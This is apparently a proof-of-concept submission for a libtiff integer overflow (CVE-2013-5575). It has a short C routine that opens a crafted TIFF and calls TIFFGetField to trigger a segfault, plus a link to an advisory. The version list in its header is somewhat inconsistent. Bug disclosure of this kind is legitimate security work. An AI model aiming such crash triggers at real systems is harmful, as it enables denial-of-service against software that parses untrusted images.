@@ -1,0 +1,40 @@
+# Exploit Title: libtiff <= 3.9.5 Integer overflow bug poc
+# Date: 2013/08/25
+# Exploit Author: x90c
+# Vendor Homepage: http://www.remotesensing.org/libtiff
+# Version:
+- libtiff 3.9.5 <=
+# Tested on:
+- libtiff 4.0.3
+- libtiff 4.0.2
+- libtiff 4.0.1
+- libtiff 4.0.0 (safe)
+- libtiff 3.9.5 (vulnerable) <=
+- libtiff 3.6.0
+# CVE : CVE-2013-5575
+
+I submit the poc of libtiff bug and
+attached original advisory too
+I want to submit the poc, sample file only
+
+http://www.x90c.org/advisories/xadv_2013001_libtiff.txt
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "tiffio.h"
+
+int tiff_integer_overflow_test(){
+TIFF* tif = TIFFOpen("/home/x90c/sample_spp.tif", "r");
+int samples = 0;
+
+/*
+ * for instance, TIFFGetField library function will
+ * called with malicious samplesperpixel field value 
+ * TIFFGetField got segfault!
+ */
+TIFFGetField(tif, TIFFTAG_SAMPLESPERPIXEL, &samples);
+
+printf("tiff_poc: tif samplesperpixel field=%d\n", samples);
+}
